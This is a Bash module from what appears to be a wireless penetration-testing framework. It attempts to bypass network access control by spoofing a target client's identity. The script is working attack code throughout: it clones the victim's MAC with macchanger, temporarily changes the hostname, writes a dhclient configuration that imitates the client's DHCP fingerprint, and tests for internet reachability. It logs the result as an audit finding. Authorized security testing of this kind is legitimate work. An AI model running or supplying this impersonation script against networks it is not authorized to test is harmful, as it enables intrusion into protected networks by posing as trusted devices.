#!/usr/bin/env bash
# MODULE_META
# NAME="NAC / Port Security Bypass"
# CATEGORY="G"
# DEPS="A4"
# CRITICAL="no"
# TOOLS="macchanger,dhclient,hostname"
# DESC="Attempt to bypass Network Access Control via Full Identity Spoofing"
# REQS="managed_iface"
# PCAP="no"
# TIMED="yes"
# DECODE="none"

#===============================================================================
#  modules/g4_nac_bypass.sh
#  G4: NAC / Port Security Bypass (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Use TARGET_CLIENT provided by Go brain.
#  2. Full Identity Spoofing: Clone MAC, Hostname, and DHCP Fingerprint.
#  3. Test for internal network reachability.
#===============================================================================

set -euo pipefail

# Intelligence Insight (Colors)
C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
SCAN_TIME="${SCAN_TIME:-60}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G4"
TARGET_CLIENT="${TARGET_CLIENT:-}"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

if [[ -z "$TARGET_CLIENT" ]]; then
    echo "[!] No target client specified. Identity spoofing requires a victim MAC."
    exit 0
fi

echo -e "${C_PROMPT}[*]${C_RESET} Starting NAC Bypass mission using identity: ${C_VAR}$TARGET_CLIENT${C_RESET}"

# 1. Identity Spoofing
echo -e "[*] Executing Full Identity Spoofing for ${C_VAR}$TARGET_CLIENT${C_RESET}..."
ip link set "$INTERFACE" down
macchanger -m "$TARGET_CLIENT" "$INTERFACE"

# Advanced Evasion: Spoof Hostname & DHCP Fingerprint
OLD_HOSTNAME=$(hostname)
SPOOFED_HOSTNAME="Workstation-$(echo "$TARGET_CLIENT" | cut -d: -f5,6 | tr -d ':')"
echo -e "[*] Temporarily spoofing hostname to ${C_VAR}$SPOOFED_HOSTNAME${C_RESET}..."
hostname "$SPOOFED_HOSTNAME"
trap "hostname $OLD_HOSTNAME" EXIT

ip link set "$INTERFACE" up

# Create custom dhclient.conf to mimic high-fidelity fingerprints
DHCP_CONF="${EVIDENCE_DIR}/g4_dhclient.conf"
cat <<EOF > "$DHCP_CONF"
send host-name "$SPOOFED_HOSTNAME";
request subnet-mask, broadcast-address, time-offset, routers,
        domain-name, domain-name-servers, domain-search, host-name,
        netbios-name-servers, netbios-scope, interface-mtu,
        rfc3442-classless-static-routes, ntp-servers;
EOF

echo -e "[*] Requesting DHCP lease with custom Fingerprint (Option 55)..."
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    timeout 15 dhclient -v -cf "$DHCP_CONF" "$INTERFACE" || true
else
    timeout 15 dhclient -cf "$DHCP_CONF" "$INTERFACE" >/dev/null 2>&1 &
    TOOL_PID=$!
    wait $TOOL_PID || true
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 80 --status "Verifying network access..."

# 2. Verification
BYPASS_LOG="${EVIDENCE_DIR}/${TC_ID}_results.txt"
if ping -c 1 8.8.8.8 > /dev/null 2>&1; then
    echo -e "[!] ${C_BOLD}SUCCESS: NAC BYPASSED VIA IDENTITY SPOOFING!${C_RESET}" | tee -a "$BYPASS_LOG"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "NAC Bypass Successful" \
        --severity HIGH \
        --desc "Successfully bypassed NAC on $INTERFACE by spoofing full identity of $TARGET_CLIENT." \
        --target "Local Network" \
        --evidence "$BYPASS_LOG" \
        --rationale "Cloning authorized identity markers bypasses basic NAC."
else
    echo -e "[+] Mission complete. Unrestricted access not achieved." | tee -a "$BYPASS_LOG"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[G4] Audit Complete" \
        --severity INFO \
        --desc "Attempted Full Identity Spoofing bypass. No immediate unrestricted access detected." \
        --target "Local Network" \
        --evidence "$BYPASS_LOG" \
        --rationale "Failure indicates robust NAC (e.g. 802.1X) or inactive session."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "NAC Bypass mission complete."
exit 0
